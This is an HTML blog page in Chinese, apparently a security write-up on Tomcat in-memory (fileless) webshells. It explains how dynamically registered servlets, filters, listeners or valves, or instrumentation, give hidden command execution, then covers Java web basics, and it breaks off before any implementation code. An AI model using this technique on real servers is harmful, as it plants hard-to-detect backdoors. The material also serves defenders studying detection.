@@ -1,0 +1,769 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic%7CRoboto+Slab:300,300italic,400,400italic,700,700italic%7CPT+Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"f4nx1ng.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInDown"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="内存马是无文件攻击的一种常用的手段，随着网络攻防的不断升级，内存马作为一种新的远程控制手段被抬上了攻防演练的历史舞台。 内存马，是在内存中写入恶意后门和木马并执行，达到远程控制Web服务器的一类内存马，其瞄准了企业的对外窗口：网站、应用。但传统的Webshell都是基于文件类型的，黑客可以利用上传工具或网站漏洞植入木马，区别在于Webshell内存马是无文件马，利用中间件的进程执行某些恶意代码，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tomcat内存马合集">
+<meta property="og:url" content="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
+<meta property="og:site_name" content="f4nx1ng&#39;s blog">
+<meta property="og:description" content="内存马是无文件攻击的一种常用的手段，随着网络攻防的不断升级，内存马作为一种新的远程控制手段被抬上了攻防演练的历史舞台。 内存马，是在内存中写入恶意后门和木马并执行，达到远程控制Web服务器的一类内存马，其瞄准了企业的对外窗口：网站、应用。但传统的Webshell都是基于文件类型的，黑客可以利用上传工具或网站漏洞植入木马，区别在于Webshell内存马是无文件马，利用中间件的进程执行某些恶意代码，">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/%E5%8E%9F%E7%90%861.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/%E5%8E%9F%E7%90%862.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/%E5%8E%9F%E7%90%863.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/%E5%8E%9F%E7%90%8611.png">
+<meta property="og:image" content="e:\JAVA%E5%AE%89%E5%85%A8\%E5%86%85%E5%AD%98%E9%A9%AC\%E5%86%85%E5%AD%98%E9%A9%AC\%E5%8E%9F%E7%90%86\4.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/%E5%8E%9F%E7%90%865.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/%E5%8E%9F%E7%90%866.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/%E5%8E%9F%E7%90%867.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/%E5%8E%9F%E7%90%868.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/%E5%8E%9F%E7%90%869.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/%E5%8E%9F%E7%90%8610.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/filter3.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/filter2.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/filter1.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/filter5.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/filter4.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/filter6.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/filter7.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/filter8.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/filter9.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/filter10.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/filter11.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/filter12.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/filter13.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/listener1.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/listener2.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/listener3.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/listener5.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/listener6.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/listener4.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/listener7.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/listener8.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/listener9.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/valve1.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/valve2.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/valve3.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/valve4.png">
+<meta property="article:published_time" content="2024-07-27T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-07-28T09:18:34.721Z">
+<meta property="article:author" content="f4nx1ng">
+<meta property="article:tag" content="JAVA安全">
+<meta property="article:tag" content="内存马">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/%E5%8E%9F%E7%90%861.png">
+
+
+<link rel="canonical" href="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/","path":"2024/07/28/tomcat内存马/","title":"Tomcat内存马合集"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Tomcat内存马合集 | f4nx1ng's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">f4nx1ng's blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">2</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">1</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">2</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E5%8E%9F%E7%90%86"><span class="nav-number">1.</span> <span class="nav-text">1内存马原理</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%85%B3%E4%BA%8Ewebshell%E7%9A%84%E5%8F%91%E5%B1%95%E5%8E%86%E7%A8%8B"><span class="nav-number">1.1.</span> <span class="nav-text">1.1关于webshell的发展历程</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%9E%E7%8E%B0%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="nav-number">1.2.</span> <span class="nav-text">1.2实现内存马的方式</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#java-web%E4%B8%89%E5%A4%A7%E4%BB%B6"><span class="nav-number">2.</span> <span class="nav-text">2 Java web三大件</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#servlet"><span class="nav-number">2.1.</span> <span class="nav-text">2.1Servlet</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFservlet"><span class="nav-number">2.1.1.</span> <span class="nav-text">1.什么是servlet</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E8%AF%B7%E6%B1%82%E7%9A%84%E5%A4%84%E7%90%86%E8%BF%87%E7%A8%8B"><span class="nav-number">2.1.2.</span> <span class="nav-text">2.请求的处理过程</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#servlet%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"><span class="nav-number">2.1.3.</span> <span class="nav-text">3.servlet生命周期</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#filter"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 Filter</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">2.2.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="nav-number">2.2.2.</span> <span class="nav-text">基本工作原理</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#filter%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"><span class="nav-number">2.2.3.</span> <span class="nav-text">filter的生命周期</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#filter%E9%93%BE"><span class="nav-number">2.2.4.</span> <span class="nav-text">filter链</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#listener"><span class="nav-number">2.3.</span> <span class="nav-text">2.3 Listener</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B-1"><span class="nav-number">2.3.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%94%A8%E9%80%94"><span class="nav-number">2.3.2.</span> <span class="nav-text">用途</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#jsp%E7%9A%84%E6%9C%AC%E8%B4%A8"><span class="nav-number">3.</span> <span class="nav-text">3.jsp的本质</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#tomcat%E6%9E%B6%E6%9E%84"><span class="nav-number">4.</span> <span class="nav-text">4.tomcat架构</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#wrapper%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%9B%E5%BB%BA"><span class="nav-number">4.1.</span> <span class="nav-text">4.1Wrapper对象的创建</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0servlet"><span class="nav-number">5.</span> <span class="nav-text">5.内存马实现——servlet</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">5.1.</span> <span class="nav-text">5.1测试内存马</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%85%B3%E4%BA%8Eloadonstartup"><span class="nav-number">5.2.</span> <span class="nav-text">5.2关于LoadOnStartup</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%85%B3%E4%BA%8Estandardcontext%E8%8E%B7%E5%8F%96"><span class="nav-number">5.3.</span> <span class="nav-text">5.3关于StandardContext获取</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%B3%95%E4%B8%80"><span class="nav-number">5.3.1.</span> <span class="nav-text">法一</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%B3%95%E4%BA%8C"><span class="nav-number">5.3.2.</span> <span class="nav-text">法二</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0filter"><span class="nav-number">6.</span> <span class="nav-text">6.内存马实现——filter</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">6.1.</span> <span class="nav-text">6.1前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%85%B3%E4%BA%8Efilter"><span class="nav-number">6.1.1.</span> <span class="nav-text">关于filter</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%85%B3%E4%BA%8Econtext"><span class="nav-number">6.1.2.</span> <span class="nav-text">关于context</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0"><span class="nav-number">6.2.</span> <span class="nav-text">6.2内存马实现</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0listener"><span class="nav-number">7.</span> <span class="nav-text">7.内存马实现——listener</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-1"><span class="nav-number">7.1.</span> <span class="nav-text">7.1前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%85%B3%E4%BA%8Elistener"><span class="nav-number">7.1.1.</span> <span class="nav-text">关于listener</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0-1"><span class="nav-number">7.2.</span> <span class="nav-text">7.2内存马实现</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0valve"><span class="nav-number">8.</span> <span class="nav-text">8.内存马实现——valve</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">9.</span> <span class="nav-text">参考文章：</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="f4nx1ng"
+      src="/images/touxiang.jpg">
+  <p class="site-author-name" itemprop="name">f4nx1ng</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/f4nx1ng" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;f4nx1ng" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpg">
+      <meta itemprop="name" content="f4nx1ng">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="f4nx1ng's blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Tomcat内存马合集 | f4nx1ng's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Tomcat内存马合集
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-07-28 00:00:00 / 修改时间：17:18:34" itemprop="dateCreated datePublished" datetime="2024-07-28T00:00:00+08:00">2024-07-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%86%85%E5%AD%98%E9%A9%AC/" itemprop="url" rel="index"><span itemprop="name">内存马</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>内存马是无文件攻击的一种常用的手段，随着网络攻防的不断升级，内存马作为一种新的远程控制手段被抬上了攻防演练的历史舞台。</p>
+<p>内存马，是在内存中写入恶意后门和木马并执行，达到远程控制Web服务器的一类内存马，其瞄准了企业的对外窗口：网站、应用。但传统的Webshell都是基于文件类型的，黑客可以利用上传工具或网站漏洞植入木马，区别在于Webshell内存马是无文件马，利用中间件的进程执行某些恶意代码，不会有文件落地，给检测带来巨大难度。</p>
+<span id="more"></span>
+<h4 id="内存马原理">1内存马原理</h4>
+<h5 id="关于webshell的发展历程">1.1关于webshell的发展历程</h5>
+<p>大马——小马拉大马——一句话木马——加密一句话木马——内存马</p>
+<p>内存马是无文件攻击的一种常用的手段，随着网络攻防的不断升级，内存马作为一种新的远程控制手段被抬上了攻防演练的历史舞台。</p>
+<p>内存马，是在内存中写入恶意后门和木马并执行，达到远程控制Web服务器的一类内存马，其瞄准了企业的对外窗口：网站、应用。但传统的Webshell都是基于文件类型的，黑客可以利用上传工具或网站漏洞植入木马，区别在于Webshell内存马是无文件马，利用中间件的进程执行某些恶意代码，不会有文件落地，给检测带来巨大难度</p>
+<h5 id="实现内存马的方式">1.2实现内存马的方式</h5>
+<p>以java为例，客户端发起的web请求会依次经过Listener、Filter、Servlet三个组件，我们只要在这个请求的过程中做手脚，在内存中修改已有的组件或者动态注册一个新的组件，插入恶意的shellcode，就可以达到我们的目的。</p>
+<img data-src="/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/%E5%8E%9F%E7%90%861.png" class>
+<p>通过实现内存马的方式我们可以进一步引出内存马的类型：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.servlet-api型</span><br><span class="line">通过命令执行等方式动态注册一个新的listener、filter或者servlet，从而实现命令执行等功能。特定框架、容器的内存马原理与此类似，如spring的controller内存马，tomcat的valve内存马</span><br><span class="line">2.字节码增强型</span><br><span class="line">通过java的instrumentation动态修改已有代码，进而实现命令执行等功能。</span><br></pre></td></tr></table></figure>
+<h4 id="java-web三大件"><strong>2 Java web三大件</strong></h4>
+<h5 id="servlet"><strong>2.1Servlet</strong></h5>
+<h6 id="什么是servlet"><strong>1.什么是servlet</strong></h6>
+<p>Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 HTTP
+客户端的请求和 HTTP
+服务器上的数据库或应用程序之间的中间层。它负责处理用户的请求，并根据请求生成相应的返回信息提供给用户。</p>
+<h6 id="请求的处理过程"><strong>2.请求的处理过程</strong></h6>
+<p>客户端发起一个http请求，比如get类型。</p>
+<p>Servlet容器接收到请求，根据请求信息，封装成HttpServletRequest和HttpServletResponse对象。</p>
+<p>Servlet容器调用HttpServlet的init()方法，init方法只在第一次请求的时候被调用。</p>
+<p>Servlet容器调用service()方法。</p>
+<p>service()方法根据请求类型，这里是get类型，分别调用doGet或者doPost方法，这里调用doGet方法。</p>
+<p>doXXX方法中是我们自己写的业务逻辑。</p>
+<p>业务逻辑处理完成之后，返回给Servlet容器，然后容器将结果返回给客户端。</p>
+<p>容器关闭时候，会调用destory方法</p>
+<h6 id="servlet生命周期"><strong>3.servlet生命周期</strong></h6>
+<p>1）服务器启动时(web.xml中配置load-on-startup=1，默认为0)或者第一次请求该servlet时，就会初始化一个Servlet对象，也就是会执行初始化方法init(ServletConfig
+conf)。</p>
+<p>2）servlet对象去处理所有客户端请求，在service(ServletRequest
+req，ServletResponse res)方法中执行</p>
+<p>3）服务器关闭时，销毁这个servlet对象，执行destroy()方法。</p>
+<p>4）由JVM进行垃圾回收。</p>
+<h5 id="filter"><strong>2.2 Filter</strong></h5>
+<h6 id="简介"><strong>简介</strong></h6>
+<p>filter也称之为过滤器，是对Servlet技术的一个强补充，其主要功能是在HttpServletRequest到达
+Servlet 之前，拦截客户的HttpServletRequest
+，根据需要检查HttpServletRequest，也可以修改HttpServletRequest
+头和数据；在HttpServletResponse到达客户端之前，拦截HttpServletResponse
+，根据需要检查HttpServletResponse，也可以修改HttpServletResponse头和数据。</p>
+<h6 id="基本工作原理"><strong>基本工作原理</strong></h6>
+<p>1、Filter 程序是一个实现了特殊接口的 Java 类，与 Servlet 类似，也是由
+Servlet 容器进行调用和执行的。</p>
+<p>2、当在 web.xml 注册了一个 Filter 来对某个 Servlet
+程序进行拦截处理时，它可以决定是否将请求继续传递给 Servlet
+程序，以及对请求和响应消息是否进行修改。</p>
+<p>3、当 Servlet 容器开始调用某个 Servlet 程序时，如果发现已经注册了一个
+Filter 程序来对该 Servlet 进行拦截，那么容器不再直接调用 Servlet 的
+service 方法，而是调用 Filter 的 doFilter 方法，再由 doFilter
+方法决定是否去激活 service 方法。</p>
+<p>4、但在 Filter.doFilter 方法中不能直接调用 Servlet 的 service
+方法，而是调用 FilterChain.doFilter 方法来激活目标 Servlet 的 service
+方法，FilterChain 对象时通过 Filter.doFilter 方法的参数传递进来的。</p>
+<p>5、只要在 Filter.doFilter 方法中调用 FilterChain.doFilter
+方法的语句前后增加某些程序代码，这样就可以在 Servlet
+进行响应前后实现某些特殊功能。</p>
+<p>6、如果在 Filter.doFilter 方法中没有调用 FilterChain.doFilter
+方法，则目标 Servlet 的 service 方法不会被执行，这样通过 Filter
+就可以阻止某些非法的访问请求。</p>
+<h6 id="filter的生命周期"><strong>filter的生命周期</strong></h6>
+<p>与servlet一样，Filter的创建和销毁也由web容器负责。web
+应用程序启动时，web 服务器将创建Filter
+的实例对象，并调用其init方法，读取web.xml配置，完成对象的初始化功能，从而为后续的用户请求作好拦截的准备工作（filter对象只会创建一次，init方法也只会执行一次）。开发人员通过init方法的参数，可获得代表当前filter配置信息的FilterConfig对象。
+Filter对象创建后会驻留在内存，当web应用移除或服务器停止时才销毁。在Web容器卸载
+Filter
+对象之前被调用。该方法在Filter的生命周期中仅执行一次。在这个方法中，可以释放过滤器使用的资源。</p>
+<h6 id="filter链"><strong>filter链</strong></h6>
+<p>当多个filter同时存在的时候，组成了filter链。web服务器根据Filter在web.xml文件中的注册顺序，决定先调用哪个Filter。当第一个Filter的doFilter方法被调用时，web服务器会创建一个代表Filter链的FilterChain对象传递给该方法，通过判断FilterChain中是否还有filter决定后面是否还调用filter。</p>
+<h5 id="listener"><strong>2.3 Listener</strong></h5>
+<h6 id="简介-1">简介</h6>
+<p>JavaWeb开发中的监听器（Listener）就是Application、Session和Request三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。</p>
+<p>ServletContextListener：对Servlet上下文的创建和销毁进行监听；
